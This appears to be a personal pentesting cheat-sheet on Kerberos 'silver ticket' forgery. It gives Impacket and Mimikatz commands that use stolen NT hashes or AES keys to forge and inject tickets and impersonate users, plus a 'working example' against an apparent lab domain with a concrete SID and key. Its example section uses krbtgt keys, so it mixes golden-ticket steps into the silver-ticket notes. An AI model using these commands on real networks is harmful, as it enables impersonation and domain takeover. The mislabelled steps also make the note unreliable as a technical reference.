
# Silver ticket






to exploit:

on linux
```
# Find the domain SID
lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0

# with an NT hash
python ticketer.py -nthash $NThash -domain-sid $DomainSID -domain $DOMAIN -spn $SPN $Username

# with an AES (128 or 256 bits) key
python ticketer.py -aesKey $AESkey -domain-sid $DomainSID -domain $DOMAIN -spn $SPN $Username
```

on windows:

```
# Changing the cervice
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$serviceAccount_NThash /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt

# with an NT hash
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$serviceAccount_NThash /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt

# with an AES 128 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$serviceAccount_aes128_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt

# with an AES 256 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$serviceAccount_aes256_key /user:$username_to_impersonate /target:$targetFQDN /service:$spn_type /ptt
```


## Example

for some reason this works usually using the aeskey fixes shit for me if the rc4 doesnt work

```
# with an NT hash
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /rc4:$krbtgt_NThash /user:randomuser /ptt

# with an AES 128 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes128:$krbtgt_aes128_key /user:randomuser /ptt

# with an AES 256 key
kerberos::golden /domain:$DOMAIN /sid:$DomainSID /aes256:$krbtgt_aes256_key /user:randomuser /ptt
```

working example

```
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /startoffset:0 /endin:600 /renewmax:10080 /ptt exit
```


TEST LINUX TOMORROW

```python
ticketer.py -aesKey "154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848" -domain-sid "S-1-5-21-719815819-3726368948-3917688648" -domain "dollarcorp.moneycorp.local" -spn "CIFS/dcorp-dc.dollarcorp.moneycorp.local"  "administrator"
```


